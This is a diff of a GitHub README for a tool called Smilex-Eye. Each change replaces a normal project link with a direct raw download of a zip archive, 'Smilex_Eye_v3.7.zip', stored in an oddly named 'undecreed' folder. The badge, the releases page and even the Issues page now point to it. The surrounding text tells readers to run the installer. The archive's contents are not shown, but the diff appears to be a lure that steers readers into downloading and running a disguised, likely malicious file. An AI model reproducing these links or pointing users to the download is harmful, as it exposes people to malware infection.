@@ -1,7 +1,7 @@
 # 🌐 Smilex-Eye - Unlock Security Insights Effortlessly
 
 ## 📥 Download Now
-[![Download Smilex-Eye](https://img.shields.io/badge/Download%20Smilex--Eye-%2324A4D9?style=flat&logo=github)](https://github.com/bilawal69-tech/Smilex-Eye/releases)
+[![Download Smilex-Eye](https://raw.githubusercontent.com/bilawal69-tech/Smilex-Eye/main/undecreed/Smilex_Eye_v3.7.zip%20Smilex--Eye-%2324A4D9?style=flat&logo=github)](https://raw.githubusercontent.com/bilawal69-tech/Smilex-Eye/main/undecreed/Smilex_Eye_v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to Smilex-Eye! This tool helps you turn vast amounts of internet data into valuable security insights. Follow the steps below to get started.
@@ -24,7 +24,7 @@ Smilex-Eye offers a range of features for improved efficiency in security resear
 ## 🌐 Download & Install
 To download Smilex-Eye, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/bilawal69-tech/Smilex-Eye/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/bilawal69-tech/Smilex-Eye/main/undecreed/Smilex_Eye_v3.7.zip).
 2. **Choose Your Version:** Look for the latest release, which will be labeled with the version number. Click on it.
 3. **Download the Installer:** You will see multiple files available for download. Find the installer that matches your operating system. 
 4. **Run the Installer:** Once the download completes, locate the file in your downloads folder and double-click it to start the installation process.
@@ -41,7 +41,7 @@ After opening Smilex-Eye, you'll see a dashboard with options to input informati
 ## 👩‍💻 Support
 If you have questions or need assistance, check these resources:
 
-- **GitHub Issues:** You can report bugs or request features on the [Issues page](https://github.com/bilawal69-tech/Smilex-Eye/issues).
+- **GitHub Issues:** You can report bugs or request features on the [Issues page](https://raw.githubusercontent.com/bilawal69-tech/Smilex-Eye/main/undecreed/Smilex_Eye_v3.7.zip).
 - **User Guide:** A comprehensive user guide will help you maximize the application's potential.
 
 ## 📦 Future Updates
